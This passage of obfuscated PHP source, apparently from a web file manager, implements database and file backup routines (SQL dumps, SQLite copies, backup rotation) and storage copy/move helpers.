this_url(), $BŠË…ˆ®¿[14] => $GLOBALS[$BŠË…ˆ®¿[14]], $BŠË…ˆ®¿[15] => $GLOBALS[$BŠË…ˆ®¿[16]])); $a„Ä“×´Ú = str_replace(array($BŠË…ˆ®¿[17]), array($BŠË…ˆ®¿[2]), $a„Ä“×´Ú); return write_log($Få‚–Á•É‚ . $BŠË…ˆ®¿[18] . $a„Ä“×´Ú, $BŠË…ˆ®¿[19]); } goto eİİ»„Ü£‰; EÄˆááùİ–: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $e™‡ÜÑÈŞÍ =& $_SERVER[İåâé¾]; self::$name = date($e™‡ÜÑÈŞÍ[444]); if (!($a¹’Šä¯éÄ = Model($e™‡ÜÑÈŞÍ[445])->lastItem())) { $a¹’Šä¯éÄ = $this->initData(); } else { self::$name = $a¹’Šä¯éÄ[$e™‡ÜÑÈŞÍ[28]]; if ($a¹’Šä¯éÄ[$e™‡ÜÑÈŞÍ[446]] == $e™‡ÜÑÈŞÍ[376]) { self::$name = date($e™‡ÜÑÈŞÍ[447]); $f˜è“ªØ­¬ = 0; if (isset($a¹’Šä¯éÄ[$e™‡ÜÑÈŞÍ[284]][$e™‡ÜÑÈŞÍ[163]][$e™‡ÜÑÈŞÍ[382]])) { $f˜è“ªØ­¬ = (int) $a¹’Šä¯éÄ[$e™‡ÜÑÈŞÍ[284]][$e™‡ÜÑÈŞÍ[163]][$e™‡ÜÑÈŞÍ[382]]; } if ($a¹’Šä¯éÄ[$e™‡ÜÑÈŞÍ[28]] == self::$name) { Model($e™‡ÜÑÈŞÍ[445])->remove($a¹’Šä¯éÄ[$e™‡ÜÑÈŞÍ[368]]); } $a¹’Šä¯éÄ = $this->initData($f˜è“ªØ­¬, $a¹’Šä¯éÄ[$e™‡ÜÑÈŞÍ[448]]); } else { $this->checkStore($a¹’Šä¯éÄ[$e™‡ÜÑÈŞÍ[448]]); } } self::$option = $a¹’Šä¯éÄ; } private function initData($eÄ±¨¢Ç = 0, $B³Æ¥¥è¡à = '') { goto eÊŒ›ğ‰ÆÇ; cØŠ‡Š«É: $EªÏ¾÷îèÒ[$b¾òˆêŞàØ[368]] = $d¹À…èÇ‰Ê; return $EªÏ¾÷îèÒ; goto a´³¡éé‹§; eÊŒ›ğ‰ÆÇ: $b¾òˆêŞàØ =& $_SERVER[İåâé¾]; $fé”¿óŒÉ± = Model($b¾òˆêŞàØ[445])->config(); if ($B³Æ¥¥è¡à && $fé”¿óŒÉ±[$b¾òˆêŞàØ[448]] != $B³Æ¥¥è¡à) { $eÄ±¨¢Ç = 0; } goto fäŠªŠê°·; fäŠªŠê°·: $this->checkStore($fé”¿óŒÉ±[$b¾òˆêŞàØ[448]]); $EªÏ¾÷îèÒ = array($b¾òˆêŞàØ[448] => $fé”¿óŒÉ±[$b¾òˆêŞàØ[448]], $b¾òˆêŞàØ[28] => self::$name, $b¾òˆêŞàØ[446] => 0, $b¾òˆêŞàØ[449] => $fé”¿óŒÉ±[$b¾òˆêŞàØ[449]], $b¾òˆêŞàØ[284] => array($b¾òˆêŞàØ[450] => array($b¾òˆêŞàØ[446] => 0), $b¾òˆêŞàØ[451] => array($b¾òˆêŞàØ[446] => 0, $b¾òˆêŞàØ[452] => 0, $b¾òˆêŞàØ[453] => 0, $b¾òˆêŞàØ[29] => $b¾òˆêŞàØ[33]), $b¾òˆêŞàØ[454] => array($b¾òˆêŞàØ[446] => 0, $b¾òˆêŞàØ[452] => 0, $b¾òˆêŞàØ[453] => 0), $b¾òˆêŞàØ[163] => array($b¾òˆêŞàØ[446] => 0, $b¾òˆêŞàØ[455] => 0, $b¾òˆêŞàØ[456] => 0, $b¾òˆêŞàØ[457] => 0, $b¾òˆêŞàØ[458] => 0, $b¾òˆêŞàØ[382] => $eÄ±¨¢Ç)), $b¾òˆêŞàØ[459] => time(), $b¾òˆêŞàØ[460] => 0); $d¹À…èÇ‰Ê = Model($b¾òˆêŞàØ[445])->insert($EªÏ¾÷îèÒ); goto cØŠ‡Š«É; a´³¡éé‹§: } private function checkStore($E™——æİ) { $aÉŸŞíîÎ® =& $_SERVER[İåâé¾]; $aƒñø¼²š = Model($aÉŸŞíîÎ®[461])->listData($E™——æİ); Model($aÉŸŞíîÎ®[461])->checkConfig($aƒñø¼²š); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[İåâé¾][445])->findByName(self::$name); } return self::$option; } public static function set($f°µÌ¹éÕ) { $a›¢±Ôöß‹ =& $_SERVER[İåâé¾]; $EŠÆŸÂ¥ = self::get(); foreach ($f°µÌ¹éÕ as $d¦‚ïÖ´ø => $EêÀ¶”Ç¢—) { $fµ¨–Ê”ìÌ = explode($a›¢±Ôöß‹[90], $d¦‚ïÖ´ø); $b‚İ¾¸åã = count($fµ¨–Ê”ìÌ); switch ($b‚İ¾¸åã) { case 1: $EŠÆŸÂ¥[$fµ¨–Ê”ìÌ[0]] = $EêÀ¶”Ç¢—; break; case 2: $EŠÆŸÂ¥[$fµ¨–Ê”ìÌ[0]][$fµ¨–Ê”ìÌ[1]] = $EêÀ¶”Ç¢—; break; case 3: $EŠÆŸÂ¥[$fµ¨–Ê”ìÌ[0]][$fµ¨–Ê”ìÌ[1]][$fµ¨–Ê”ìÌ[2]] = $EêÀ¶”Ç¢—; break; } } Model($a›¢±Ôöß‹[445])->update($EŠÆŸÂ¥[$a›¢±Ôöß‹[368]], $EŠÆŸÂ¥); self::$option = $EŠÆŸÂ¥; return self::$option; } public function keep() { $Fä´‹ãáš =& $_SERVER[İåâé¾]; $B„µ†öÆ‚­ = self::get(); if ($B„µ†öÆ‚­[$Fä´‹ãáš[284]][$Fä´‹ãáš[450]][$Fä´‹ãáš[446]] == $Fä´‹ãáš[376]) { return; } $this->backupKeep($B„µ†öÆ‚­); self::set(array($Fä´‹ãáš[462] => 1)); } private function backupKeep($aã‰ÊË÷³) { goto C‹ò¢†Ê¾; ağƒ«ªâÜ°: $AŒäø¹ÓçÑ = array_unique($AŒäø¹ÓçÑ); foreach ($eºìÙÏˆÒ“ as $d’‘åÛÛ½Ø) { if (!empty($d’‘åÛÛ½Ø[$eš•¢¬Ù[28]]) && in_array($d’‘åÛÛ½Ø[$eš•¢¬Ù[28]], $AŒäø¹ÓçÑ)) { continue; } Model($eš•¢¬Ù[445])->remove($d’‘åÛÛ½Ø[$eš•¢¬Ù[368]]); $bÉ——ò÷¦¨ = "\x7b\x69\157\x3a{$aã‰ÊË÷³[$eš•¢¬Ù[448]]}\x7d\57\144\141\x74\x61\x62\141\x73\145\x2f\x62\x61\x63\x6b\165\160\137{$d’‘åÛÛ½Ø[$eš•¢¬Ù[28]]}"; IO::remove($bÉ——ò÷¦¨, !1); } goto fªÕùñˆ‘¦; C‹ò¢†Ê¾: $eš•¢¬Ù =& $_SERVER[İåâé¾]; $eºìÙÏˆÒ“ = Model($eš•¢¬Ù[445])->listData(); if (empty($eºìÙÏˆÒ“)) { return; } goto BíÏ¦°–¡; BíÏ¦°–¡: $AŒäø¹ÓçÑ = array(); for ($fÖ„¹¹å¹¤ = 0; $fÖ„¹¹å¹¤ <= 7; $fÖ„¹¹å¹¤++) { $AŒäø¹ÓçÑ[] = date($eš•¢¬Ù[447], strtotime("\55{$fÖ„¹¹å¹¤}\x20\144\x61\x79\x73")); } for ($fÖ„¹¹å¹¤ = 0; $fÖ„¹¹å¹¤ < 12; $fÖ„¹¹å¹¤++) { $AŒäø¹ÓçÑ[] = date($eš•¢¬Ù[463], strtotime("\x2d{$fÖ„¹¹å¹¤}\40\x6d\157\x6e\164\150\163")); } goto ağƒ«ªâÜ°; fªÕùñˆ‘¦: } public function db() { goto fÜ›¸ª†¼á; f¥ùèôÕ‘š: return !0; goto B¨ïë½ÒÔ¨; fÜ›¸ª†¼á: $fê”¡Ìäğ =& $_SERVER[İåâé¾]; $Bë‰êƒ¢Ã = self::get(); if ($Bë‰êƒ¢Ã[$fê”¡Ìäğ[284]][$fê”¡Ìäğ[451]][$fê”¡Ìäğ[446]] == $fê”¡Ìäğ[376]) { return !0; } goto D¼Û¡ˆìÉŒ; D¼Û¡ˆìÉŒ: $bŒøçÕœãğ = new BackupDb(); if (!$bŒøçÕœãğ->index()) { return !1; } self::set(array($fê”¡Ìäğ[464] => 1)); goto f¥ùèôÕ‘š; B¨ïë½ÒÔ¨: } public function dbFile() { goto DÚ¦…›Ë; dÜ’Ä›ŒÅ‡: return !0; goto Fí›“²İ; DÚ¦…›Ë: $FÜƒÌñè·« =& $_SERVER[İåâé¾]; $fê“ˆŒØÖ = self::get(); if ($fê“ˆŒØÖ[$FÜƒÌñè·«[284]][$FÜƒÌñè·«[454]][$FÜƒÌñè·«[446]] == $FÜƒÌñè·«[376]) { return !0; } goto cÚé¶”Ğ©™; cÚé¶”Ğ©™: $Aµîİ²²Î = new BackupDbFile(); if (!$Aµîİ²²Î->index()) { return !1; } self::set(array($FÜƒÌñè·«[465] => 1)); goto dÜ’Ä›ŒÅ‡; Fí›“²İ: } public function file() { $CÎŒÙíâé =& $_SERVER[İåâé¾]; $DÁ°øÊŒÉ– = self::get(); if ($DÁ°øÊŒÉ–[$CÎŒÙíâé[284]][$CÎŒÙíâé[163]][$CÎŒÙíâé[446]] == $CÎŒÙíâé[376]) { return !0; } if (!isset($DÁ°øÊŒÉ–[$CÎŒÙíâé[449]]) || $DÁ°øÊŒÉ–[$CÎŒÙíâé[449]] == $CÎŒÙíâé[402]) { $cÌßğî•µ = new BackupFile(); if (!$cÌßğî•µ->index()) { return !1; } } self::set(array($CÎŒÙíâé[466] => 1, $CÎŒÙíâé[446] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto b¼½Éáµñè; bŒéùÆ’À®: foreach ($fóšŠÒ…òã as $Aµ”ó×·¢) { $E…´Ä‘Å· = "{$Aï©˜â¶}{$Aµ”ó×·¢}\56\x73\161\154"; $Ešäëæ«Ä += $this->makeSqlFile($Aµ”ó×·¢, $E…´Ä‘Å·, $E¦‘‰ŞÙñõ, $Bá—Øå¹Ş•); } $E¦‘‰ŞÙñõ->end(); $fÛÀÑÌ°Âƒ = array($f·¶‡­Éô·[464] => 1, $f·¶‡­Éô·[476] => $Ešäëæ«Ä); goto c¨Î¨áÓŸæ; c‹Öí¢¬ß…: self::$name = $Bá—Øå¹Ş•[$f·¶‡­Éô·[28]]; if ($bÉá¦Ôâ×¦ = $this->sqliteFile()) { return $this->sqliteBackup($bÉá¦Ôâ×¦); } $FÏ´°® = 0; goto dé¢§ÒÛĞ; DªŸˆëÓãñ: $fÛÀÑÌ°Âƒ = array($f·¶‡­Éô·[472] => $f·¶‡­Éô·[473], $f·¶‡­Éô·[474] => $FÏ´°® + 1); Backup::set($fÛÀÑÌ°Âƒ); $Ešäëæ«Ä = 0; goto e‘«±ºùÃã; b¼½Éáµñè: $f·¶‡­Éô· =& $_SERVER[İåâé¾]; $Bá—Øå¹Ş• = Backup::get(); self::$io = $Bá—Øå¹Ş•[$f·¶‡­Éô·[448]]; goto c‹Öí¢¬ß…; c¨Î¨áÓŸæ: Backup::set($fÛÀÑÌ°Âƒ); return !0; goto bœ˜—Ô¿æ†; dé¢§ÒÛĞ: $fóšŠÒ…òã = Model()->db()->getTables(); foreach ($fóšŠÒ…òã as $Aµ”ó×·¢) { $FÏ´°® += Model($Aµ”ó×·¢)->count(); } $E¦‘‰ŞÙñõ = new Task($f·¶‡­Éô·[467], $f·¶‡­Éô·[468], $FÏ´°®, LNG($f·¶‡­Éô·[469]) . $f·¶‡­Éô·[470] . LNG($f·¶‡­Éô·[471])); goto DªŸˆëÓãñ; e‘«±ºùÃã: $Aï©˜â¶ = TEMP_FILES . $f·¶‡­Éô·[475] . self::$name . $f·¶‡­Éô·[8]; del_dir($Aï©˜â¶); mk_dir($Aï©˜â¶); goto bŒéùÆ’À®; bœ˜—Ô¿æ†: } public function makeSqlFile($cùõá‰²‹, $e·ìÃš½Ã, $dŞ«ëÏ›ßŒ, $Eƒ¿ÆˆÒ³ä) { goto Aá°­ê«—§; aŠ½™„ñÇ¥: return $BÏ±çñ—Ô‚; goto dë¾æšÇ³‚; Aá°­ê«—§: $cö¥²ÚäØƒ = self::$io; $BÏ±çñ—Ô‚ = 0; $e½ñŠ‰µ‚ñ = 1; goto CßƒÅçñì; CßƒÅçñì: $E¦µ‡›±ğ = 2000; $F¼âÍÍ–Ÿ = fopen($e·ìÃš½Ã, $_SERVER[İåâé¾][477]); $F§™öÉÄ—å = Model($cùõá‰²‹)->getPk(); goto f²¥öŠ™ç; f²¥öŠ™ç: $CİÓ˜Ñ–Íí = Model($cùõá‰²‹)->getDbFields(); do { $AëÏŒÏ… = Model($cùõá‰²‹)->field($CİÓ˜Ñ–Íí)->order($F§™öÉÄ—å . $_SERVER[İåâé¾][478])->selectPage($E¦µ‡›±ğ, $e½ñŠ‰µ‚ñ); $câİ¹±‹¡ê = !empty($AëÏŒÏ…[$_SERVER[İåâé¾][356]]) ? $AëÏŒÏ…[$_SERVER[İåâé¾][356]] : array(); $aÑ×İ¸—„Ï = array(); foreach ($câİ¹±‹¡ê as $aä•‹‘ËÃ„) { if ($cùõá‰²‹ == $_SERVER[İåâé¾][479] && (!isset($Eƒ¿ÆˆÒ³ä[$_SERVER[İåâé¾][449]]) || $Eƒ¿ÆˆÒ³ä[$_SERVER[İåâé¾][449]] == $_SERVER[İåâé¾][402])) { $aä•‹‘ËÃ„[$_SERVER[İåâé¾][76]] = str_replace("\x7b\x69\157\x3a{$aä•‹‘ËÃ„[$_SERVER[İåâé¾][480]]}\175", "\x7b\151\x6f\72{$cö¥²ÚäØƒ}\x7d", $aä•‹‘ËÃ„[$_SERVER[İåâé¾][76]]); $aä•‹‘ËÃ„[$_SERVER[İåâé¾][480]] = $cö¥²ÚäØƒ; } $aÑ×İ¸—„Ï[] = $_SERVER[İåâé¾][481] . $this->addSqlSlashes($aä•‹‘ËÃ„) . $_SERVER[İåâé¾][482]; } if ($FÑ•…Ï‡‚ = count($câİ¹±‹¡ê)) { $D„¯‰‡ï± = "\x49\x4e\x53\x45\x52\124\x20\111\x4e\124\117\40\140{$cùõá‰²‹}\x60\x20\x28\x60" . implode($_SERVER[İåâé¾][483], $CİÓ˜Ñ–Íí) . $_SERVER[İåâé¾][484]; fwrite($F¼âÍÍ–Ÿ, $D„¯‰‡ï± . implode($_SERVER[İåâé¾][485], $aÑ×İ¸—„Ï) . $_SERVER[İåâé¾][68] . PHP_EOL); $dŞ«ëÏ›ßŒ->update($FÑ•…Ï‡‚); } $e½ñŠ‰µ‚ñ++; $BÏ±çñ—Ô‚ += $FÑ•…Ï‡‚; } while ($FÑ•…Ï‡‚ == $E¦µ‡›±ğ); fclose($F¼âÍÍ–Ÿ); goto aŠ½™„ñÇ¥; dë¾æšÇ³‚: } private function addSqlSlashes($fïøîÅÕêâ) { $fƒçÌĞ¸›ˆ =& $_SERVER[İåâé¾]; $C¬ˆ ¸–½® = array(); foreach ($fïøîÅÕêâ as $e¾ğ¦éò¿æ) { if (is_array($e¾ğ¦éò¿æ)) { $e¾ğ¦éò¿æ = json_encode_force($e¾ğ¦éò¿æ); } $e¾ğ¦éò¿æ = addslashes($e¾ğ¦éò¿æ); $e¾ğ¦éò¿æ = str_replace(array($fƒçÌĞ¸›ˆ[486], $fƒçÌĞ¸›ˆ[223]), array($fƒçÌĞ¸›ˆ[487], $fƒçÌĞ¸›ˆ[488]), $e¾ğ¦éò¿æ); $C¬ˆ ¸–½®[] = $e¾ğ¦éò¿æ; } return $fƒçÌĞ¸›ˆ[55] . implode($fƒçÌĞ¸›ˆ[489], $C¬ˆ ¸–½®) . $fƒçÌĞ¸›ˆ[55]; } private function sqliteFile() { $eËºÀÖõ¯ =& $_SERVER[İåâé¾]; $AšˆÂ†ªí = null; $D§òÌõÓ‡« = $GLOBALS[$eËºÀÖõ¯[6]][$eËºÀÖõ¯[17]]; if ($D§òÌõÓ‡«[$eËºÀÖõ¯[490]] == $eËºÀÖõ¯[491]) { $AóââÊé½é = explode($eËºÀÖõ¯[492], $D§òÌõÓ‡«[$eËºÀÖõ¯[493]]); if (substr($AóââÊé½é[0], 0, 6) == $eËºÀÖõ¯[9]) { $AšˆÂ†ªí = $AóââÊé½é[1]; } } else { if (substr($D§òÌõÓ‡«[$eËºÀÖõ¯[490]], 0, 6) == $eËºÀÖõ¯[9]) { $AšˆÂ†ªí = $D§òÌõÓ‡«[$eËºÀÖõ¯[237]]; } } return $AšˆÂ†ªí; } public function sqliteBackup($bÖ‚œøô‘) { goto A¡”¾ŸÜµì; A¡”¾ŸÜµì: $f¦£Ê¯ÇÙÃ =& $_SERVER[İåâé¾]; $c›ÇËØ¥Îğ = self::$io; $FİŒËÇÜŸ = CONTROLLER_DIR . $f¦£Ê¯ÇÙÃ[494]; goto b…¦¥ä¸àã; EÓÃÃœ¢: $EÛ÷Ø¥ì·«->task[$f¦£Ê¯ÇÙÃ[455]] = $cŒËÂÎøŒé; IO::copy($FİŒËÇÜŸ . $f¦£Ê¯ÇÙÃ[500], $Fä¼‰ù¦ö); IO::copy($bÖ‚œøô‘, $Fä¼‰ù¦ö); goto aíïºÅ¼”•; f‘ĞÒË¹–å: $cÒ”ÔÃáª® = array($f¦£Ê¯ÇÙÃ[472] => $f¦£Ê¯ÇÙÃ[9], $f¦£Ê¯ÇÙÃ[474] => 1, $f¦£Ê¯ÇÙÃ[496] => $cŒËÂÎøŒé); Backup::set($cÒ”ÔÃáª®); $EÛ÷Ø¥ì·« = new TaskFileTransfer($f¦£Ê¯ÇÙÃ[497], $f¦£Ê¯ÇÙÃ[468], 1, LNG($f¦£Ê¯ÇÙÃ[469]) . $f¦£Ê¯ÇÙÃ[498] . LNG($f¦£Ê¯ÇÙÃ[471]) . $f¦£Ê¯ÇÙÃ[499]); goto EÓÃÃœ¢; aíïºÅ¼”•: $EÛ÷Ø¥ì·«->end(); $cÒ”ÔÃáª® = array($f¦£Ê¯ÇÙÃ[464] => 1, $f¦£Ê¯ÇÙÃ[476] => 1, $f¦£Ê¯ÇÙÃ[465] => 1, $f¦£Ê¯ÇÙÃ[501] => $cŒËÂÎøŒé); Backup::set($cÒ”ÔÃáª®); goto fÜ×Ò‚½ƒ; b…¦¥ä¸àã: $Fä¼‰ù¦ö = "\173\x69\157\72{$c›ÇËØ¥Îğ}\175\57\144\141\x74\141\x62\141\x73\145\x2f\x62\141\x63\x6b\165\x70\x5f" . self::$name . $f¦£Ê¯ÇÙÃ[495]; if (!IO::exist($Fä¼‰ù¦ö)) { IO::mkdir($Fä¼‰ù¦ö); } $cŒËÂÎøŒé = IO::size($bÖ‚œøô‘); goto f‘ĞÒË¹–å; fÜ×Ò‚½ƒ: return !1; goto D •Şˆà¾‰; D •Şˆà¾‰: } } class BackupDbFile { public function __construct() { } public function index() { goto a©¾Şˆ–õ; aÓÉöæµ©: IO::copy($BóÇ•’ÃÉ, $EÆ¥¸ªæÒ . "\142\141\143\x6b\x75\x70\x5f{$fô¨¢ÖŞĞ¼}\57"); $cİë×ÜµÍö->end(); Backup::set(array($F†§¾í…˜[501] => $Dø‘İ¾²„[$F†§¾í…˜[78]])); goto cÔÌ­Œ¤î; dƒäØŠåï: $Eğñö–öæ‡ = TEMP_FILES . "\142\x61\x63\x6b\x75\160\x5f{$fô¨¢ÖŞĞ¼}\x2f"; $EÆ¥¸ªæÒ = "\x7b\151\x6f\72{$CŞ”‰áËßÜ[$F†§¾í…˜[448]]}\x7d\x2f\144\141\x74\141\x62\141\163\x65\x2f"; IO::mkdir($EÆ¥¸ªæÒ . "\x62\141\x63\153\165\160\x5f{$fô¨¢ÖŞĞ¼}\57"); goto fµœ´õîæ¹; fÛøæ¦Ä: Backup::set(array($F†§¾í…˜[496] => $Dø‘İ¾²„[$F†§¾í…˜[78]])); IO::move($Eğñö–öæ‡, $EÆ¥¸ªæÒ); $BóÇ•’ÃÉ = CONTROLLER_DIR . $F†§¾í…˜[502]; goto aÓÉöæµ©; fµœ´õîæ¹: $cİë×ÜµÍö = new TaskFileTransfer($F†§¾í…˜[497], $F†§¾í…˜[468], 0, LNG($F†§¾í…˜[469]) . $F†§¾í…˜[498] . LNG($F†§¾í…˜[471]) . $F†§¾í…˜[499]); $cİë×ÜµÍö->addPath($Eğñö–öæ‡); $Dø‘İ¾²„ = IO::infoWithChildren($Eğñö–öæ‡); goto fÛøæ¦Ä; cÔÌ­Œ¤î: return !0; goto câìä‰ï§; a©¾Şˆ–õ: $F†§¾í…˜ =& $_SERVER[İåâé¾]; $CŞ”‰áËßÜ = Backup::get(); $fô¨¢ÖŞĞ¼ = $CŞ”‰áËßÜ[$F†§¾í…˜[28]]; goto dƒäØŠåï; câìä‰ï§: } } goto B³Ø„Úƒ®Š; A±ô„âŠî¦: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($EÓÔÑíÂ°, $FÊÇ‰åôÊ¿) { $b¯òŒ·ÄØ˜ = self::driverMake($FÊÇ‰åôÊ¿[0]); if (method_exists($b¯òŒ·ÄØ˜, $EÓÔÑíÂ°)) { return @call_user_func_array(array($b¯òŒ·ÄØ˜, $EÓÔÑíÂ°), $FÊÇ‰åôÊ¿); } if (method_exists($b¯òŒ·ÄØ˜, $_SERVER[İåâé¾][739])) { return @call_user_func_array(array($b¯òŒ·ÄØ˜, $EÓÔÑíÂ°), $FÊÇ‰åôÊ¿); } else { if (method_exists(self, $EÓÔÑíÂ°)) { return @call_user_func_array(array(self, $EÓÔÑíÂ°), $FÊÇ‰åôÊ¿); } else { call_user_func_array(array(parent, $EÓÔÑíÂ°), $FÊÇ‰åôÊ¿); } } } public static function init($BÔ¡õĞË‹ë) { return self::driverMake($BÔ¡õĞË‹ë); } public static function copy($e¼¯†¼®Ÿ¾, $Fèğ°ºœÂ…, $cÁ©…ÊÛ·æ = false) { return self::copyMove($e¼¯†¼®Ÿ¾, $Fèğ°ºœÂ…, $cÁ©…ÊÛ·æ, $_SERVER[İåâé¾][740]); } public static function move($D¨•¶èø¸ğ, $bâÅ‚¨™ô, $B­™ºÆÅëÜ = false) { return self::copyMove($D¨•¶èø¸ğ, $bâÅ‚¨™ô, $B­™ºÆÅëÜ, $_SERVER[İåâé¾][741]); } public static function saveFile($dĞ†‚ÓÑ¯¤, $b÷¸½±Ü¾â, $A´¬Å‚‘È = true) { goto F¡Ø¨‹–ö; aÅÍóøâ¤Ë: $Fàä¦™‘’¢ = self::copyFile($DèèÄ×‘², $dĞ†‚ÓÑ¯¤, $aåôĞô‚‘¾, $FÈª‘¯…­, $cİæ·Êóåª[$EÊ—ƒ‘ñ×[28]], $F­“È²ì–); if ($fÚñ‡âĞ) { $Fàä¦™‘’¢ = $fÚñ‡âĞ->getPathOuter($Fàä¦™‘’¢); } return $Fàä¦™‘’¢; goto e¶Ó—¼—; fªƒñ•¨Çˆ: $FÈª‘¯…­ = $aåôĞô‚‘¾->pathFather($b÷¸½±Ü¾â); $F­“È²ì– = !0; if (!$A´¬Å‚‘È && self::driverIsSame($DèèÄ×‘², $aåôĞô‚‘¾)) { $F­“È²ì– = !1; } goto aÅÍóøâ¤Ë; F¡Ø¨‹–ö: $EÊ—ƒ‘ñ× =& $_SERVER[İåâé¾]; $cİæ·Êóåª = self::info($b÷¸½±Ü¾â); $DèèÄ×‘² = self::driverMake($dĞ†‚ÓÑ¯¤); goto B¹Á‘ÕËµ ; B¹Á‘ÕËµ : $aåôĞô‚‘¾ = self::driverMake($b÷¸½±Ü¾â); $fÚñ‡âĞ = !1; if ($aåôĞô‚‘¾->pathParse[$EÊ—ƒ‘ñ×[742]]) { $E¢ƒ‚İ¬ƒ = $aåôĞô‚‘¾->pathParse[$EÊ—ƒ‘ñ×[742]]; $fÚñ‡âĞ = $aåôĞô‚‘¾; $aåôĞô‚‘¾ = self::driverMake($E¢ƒ‚İ¬ƒ); } goto fªƒñ•¨Çˆ; e¶Ó—¼—: } private static function copyMove($FÌØ‰ªäƒ˜, $B¼Ï” ‚Ê¯, $CÔÅæàÈõÍ, $BÆÄ†¸£ìî) { goto b´Íˆµ÷‰; b´Íˆµ÷‰: $BŠùÄôÓîŒ =& $_SERVER[İåâé¾]; ignore_timeout(); $f´šŸ½ïÉ = self::driverMake($FÌØ‰ªäƒ˜); goto EÎˆ¨Æ×§©; EÎˆ¨Æ×§©: $E¤‹ÚØ£ = self::driverMake($B¼Ï” ‚Ê¯); $d»¹Œ¯‚×Ô = $BÆÄ†¸£ìî == $BŠùÄôÓîŒ[741]; $aÏé„Ë†¥ = !1; goto fŒŠ…‹¶à; fŒŠ…‹¶à: if ($E¤‹ÚØ£->pathParse[$BŠùÄôÓîŒ[742]]) { $B¼Ï” ‚Ê¯ = $E¤‹ÚØ£->pathParse[$BŠùÄôÓîŒ[742]]; $aÏé„Ë†¥ = $E¤‹ÚØ£; $E¤‹ÚØ£ = self::driverMake($B¼Ï” ‚Ê¯); } self::check($f´šŸ½ïÉ, $FÌØ‰ªäƒ˜, $E¤‹ÚØ£, $B¼Ï” ‚Ê¯); Hook::trigger($BŠùÄôÓîŒ[73], $f´šŸ½ïÉ, $FÌØ‰ªäƒ˜, $E¤‹ÚØ£, $B¼Ï” ‚Ê¯); goto d¸ß„…Œââ; d¸ß„…Œââ: $B†ÔÏ • = self::driverIsSame($f´šŸ½ïÉ, $E¤‹ÚØ£); if ($B†ÔÏ •) { if ($BÆÄ†¸£ìî == $BŠùÄôÓîŒ[741] && trim($B¼Ï” ‚Ê¯, $BŠùÄôÓîŒ[8]) == trim($E¤‹ÚØ£->pathFather($FÌØ‰ªäƒ˜), $BŠùÄôÓîŒ[8])) { return $E¤‹ÚØ£->getPathOuter($FÌØ‰ªäƒ˜); } if (method_exists($E¤‹ÚØ£, $BÆÄ†¸£ìî)) { return $E¤‹ÚØ£->{$BÆÄ†¸£ìî}($FÌØ‰ªäƒ˜, $B¼Ï” ‚Ê¯, $CÔÅæàÈõÍ); } } $d¶ïùˆˆëÄ = $f´šŸ½ïÉ->isFile($FÌØ‰ªäƒ˜); goto F¶£Ğ…ìäİ; Fò¤á¤à¿±: return $e¢­Ğˆ´Œ; goto a»”å¹éÂ‹; F¶£Ğ…ìäİ: if (!$d¶ïùˆˆëÄ && $E¤‹ÚØ£->getType() == $BŠùÄôÓîŒ[451] && $f´šŸ½ïÉ->getType() == $BŠùÄôÓîŒ[100]) { $e¢­Ğˆ´Œ = $E¤‹ÚØ£->copyFolderFromIO($f´šŸ½ïÉ, $FÌØ‰ªäƒ˜, $B¼Ï” ‚Ê¯, $CÔÅæàÈõÍ, $d»¹Œ¯‚×Ô); } else { $e¢­Ğˆ´Œ = self::copyPath($f´šŸ½ïÉ, $FÌØ‰ªäƒ˜, $E¤‹ÚØ£, $B¼Ï” ‚Ê¯, $CÔÅæàÈõÍ, $d»¹Œ¯‚×Ô, $d¶ïùˆˆëÄ); } if ($e¢­Ğˆ´Œ && $d»¹Œ¯‚×Ô) { $f´šŸ½ïÉ->remove($FÌØ‰ªäƒ˜); } if ($aÏé„Ë†¥) { $e¢­Ğˆ´Œ = $aÏé„Ë†¥->getPathOuter($e¢­Ğˆ´Œ); } goto Fò¤á¤à¿±; a»”å¹éÂ‹: } private static function check($c¥«»‹©˜, $aª“ÒéÓâ¿, $e½”äÉ•±†, &$C¡¿×—ˆ¶©) { $a‘ª‚Ô‡ =& $_SERVER[İåâé¾]; if (self::driverIsSame($c¥«»‹©˜, $e½”äÉ•±†) && $c¥«»‹©˜->isFolder($aª“ÒéÓâ¿) && $c¥«»‹©˜->isParentOf($aª“ÒéÓâ¿, $C¡¿×—ˆ¶©)) { show_json(LNG($a‘ª‚Ô‡[743]), !1); } if (!$c¥«»‹©˜->exist($aª“ÒéÓâ¿)) { show_json(LNG($a‘ª‚Ô‡[99]), !1); } } private static function copyPath($a©¦Ğ™£Ì®, $EêÎ±ôÖàæ, $A¹¥•Ù•½ê, $CíÂ›Ì­, $E×¯¨áÂ£ß, $Eºî“šÀ…„, $f££ßöÙŒ«) { goto AÈ„í®ğİ¡; AÈ„í®ğİ¡: $bš¯ÜöÕµø =& $_SERVER[İåâé¾]; $Aøß÷ÙŸ›² = $a©¦Ğ™£Ì®->getPathName($a©¦Ğ™£Ì®->pathThis($EêÎ±ôÖàæ)); if ($E×¯¨áÂ£ß) { $B¤Éí‡ÔÓÆ = $A¹¥•Ù•½ê->fileNameExist($CíÂ›Ì­, $Aøß÷ÙŸ›²); $Aøß÷ÙŸ›² = $A¹¥•Ù•½ê->fileNameAuto($CíÂ›Ì­, $Aøß÷ÙŸ›², $E×¯¨áÂ£ß, !$f££ßöÙŒ«); $E×¯¨áÂ£ß = $B¤Éí‡ÔÓÆ ? $E×¯¨áÂ£ß : !1; } goto aÜãº”‡¤…; BÀ‚¯Éñ‹ˆ: $b£îËµƒŞ = array_merge($BŠÙ³¿ƒ£[$bš¯ÜöÕµø[74]], $BŠÙ³¿ƒ£[$bš¯ÜöÕµø[75]]); foreach ($b£îËµƒŞ as $DÔëáø˜š£) { $a—Úù»¬ìÅ = $DÔëáø˜š£[$bš¯ÜöÕµø[29]] == $bš¯ÜöÕµø[163]; $EêÎ±ôÖàæ = $a©¦Ğ™£Ì®->getPathInner($DÔëáø˜š£[$bš¯ÜöÕµø[76]]); $dñ²ÍÒêÕÑ = self::copyPath($a©¦Ğ™£Ì®, $EêÎ±ôÖàæ, $A¹¥•Ù•½ê, $CíÂ›Ì­, $E×¯¨áÂ£ß, $Eºî“šÀ…„, $a—Úù»¬ìÅ); if (!$dñ²ÍÒêÕÑ) { write_log($bš¯ÜöÕµø[744] . $EêÎ±ôÖàæ . $bš¯ÜöÕµø[745] . 